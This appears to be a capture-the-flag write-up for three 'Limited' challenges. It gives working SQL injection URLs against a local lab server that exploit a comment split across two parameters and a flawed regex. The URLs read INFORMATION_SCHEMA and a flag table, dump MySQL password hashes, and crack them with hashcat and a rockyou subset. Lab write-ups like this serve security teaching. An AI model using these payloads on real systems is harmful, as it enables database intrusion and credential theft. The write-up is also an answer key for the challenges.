# Limited 1

SQL Injection is not possible in the limit clause.

Use the price_op with a value like `>/*` and the limit clause with a value like `*/ 100 BLAH`.

The regex check on price_op is broken since it uses match instead of search (or match with ^$).

To get this flag, you can read from the INFO column of the INFORMATION_SCHEMA.PROCESSLIST table.

For local hosting:
http://localhost:40000/query?price=10.99&price_op=%3E/*&limit=*/100%20union%20select%20INFO,1,2,3%20from%20INFORMATION_SCHEMA.PROCESSLIST




# Limited 2

First figure out the name of the table that starts with Flag_.

For local hosting:
http://localhost:40000/query?price=10.99&price_op=%3E/*&limit=*/100%20union%20select%20table_name,1,2,3%20from%20INFORMATION_SCHEMA.tables

Then get the flag from that table:

http://localhost:40000/query?price=10.99&price_op=%3E/*&limit=*/100%20union%20select%20value,1,2,3%20from%20Flag_843423739



# Limited 3

Here are some resources on cracking hashed passwords in MySQL:

https://www.percona.com/blog/brute-force-mysql-password-from-a-hash/

(see footnote 19): https://hashcat.net/wiki/doku.php?id=example_hashes

The DB user that performs the query was granted select rights on the mysql.user table specifically for this reason.

This gets you all the hashed passwords in the special format described in the above resources:

```
http://localhost:40000/query?price=10.99&price_op=%3E/*&limit=*/100%20union%20SELECT%20User,%20CONCAT(%27$mysql%27,LEFT(authentication_string,6),%27*%27,INSERT(HEX(SUBSTR(authentication_string,8)),41,0,%27*%27))%20AS%20hash,%20plugin,4%20FROM%20mysql.user
```
The hashed password of the flag user looks like this:

```
$mysql$A$005*<some-hex-digits>*<some-hex-digits)
```

Put this into a file called hashes.txt.

You "could" crack using the big rockyou.txt file.

However, it would take over an hour since it has to hash each candidate word 5000 times.

Since we were given a hint that the password is 13 characters, we can make a subset of rockyou.txt like this.

```
awk 'length($0) == 13' rockyou.txt > rockyou13.txt
```

```
hashcat -m 7401 -a 0 -O ./hashes.txt rockyou13.txt
```

This should take less than 3 minutes.

As far as I know john the ripper cannot currently handle this format.

